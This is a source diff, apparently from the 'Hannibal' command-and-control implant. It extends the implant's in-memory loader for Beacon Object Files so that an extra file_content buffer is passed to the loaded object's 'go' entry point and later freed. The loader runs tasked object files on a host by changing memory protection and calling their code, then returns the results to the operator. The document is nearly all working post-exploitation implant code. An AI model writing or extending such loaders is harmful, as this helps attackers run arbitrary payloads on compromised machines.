@@ -312,10 +312,10 @@ SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVO
     return TRUE;
 }
 
-SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVOID args, int argc, LPCWSTR buffer_message) {
+SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVOID args, int argc, PBYTE file_content, LPCWSTR buffer_message) {
     HANNIBAL_INSTANCE_PTR
 	
-	VOID(*Main)(PBYTE, ULONG, LPCWSTR) = NULL;
+	VOID(*Main)(PBYTE, ULONG, PBYTE, LPCWSTR) = NULL;
     PIMAGE_SYMBOL ObjSym = { 0 };
     PSTR Symbol = { 0 };
     PVOID SecBase = { 0 };
@@ -352,7 +352,7 @@ SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVO
 
             // Execute the BOF entry point
             Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);
-            Main((PBYTE)args, argc, buffer_message);
+            Main((PBYTE)args, argc, file_content, buffer_message);
 
             // Revert the old section protection
             if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
@@ -367,7 +367,7 @@ SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVO
     return FALSE;
 }
 
-SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc, LPCWSTR buffer_message, PSTR sFunction)
+SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc, PBYTE file_content, LPCWSTR buffer_message, PSTR sFunction)
 {
 	HANNIBAL_INSTANCE_PTR	
 
@@ -463,7 +463,7 @@ SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc
 		goto _END_OF_CODE;
 	}
 
-	if (!(Success = ObjectExecute(task_uuid, &ObjCtx, sFunction, args, argc, buffer_message))) {
+	if (!(Success = ObjectExecute(task_uuid, &ObjCtx, sFunction, args, argc, file_content, buffer_message))) {
 		pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
 		pic_strcatW(buffer_message, DbgString);
 		goto _END_OF_CODE;
@@ -489,12 +489,12 @@ _END_OF_CODE:
 	return Success;
 }
 
-SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int argc, LPCWSTR buffer_message) 
+SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int argc, PBYTE file_content, LPCWSTR buffer_message) 
 {
 	HANNIBAL_INSTANCE_PTR
 
 	int status = FALSE;
-	status = ObjectLdr(task_uuid, pbof_content, args, argc, buffer_message, "go");
+	status = ObjectLdr(task_uuid, pbof_content, args, argc, file_content, buffer_message, "go");
 
     if (!status) {
         pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");
@@ -540,13 +540,15 @@ SECTION_CODE void cmd_bof(TASK t)
         exec_bof->bof,
 		exec_bof->args,
         exec_bof->argc,
+		exec_bof->file_content,
         message_content
     );
 
     // Cleanup
     hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
     hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->file_content, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
 	// pic_RtlSecureZeroMemory(message_content, sizeof(message_content));
     hannibal_response(message_content, t.task_uuid);
     hannibal_instance_ptr->Win32.VirtualFree(message_content, 0, MEM_RELEASE);
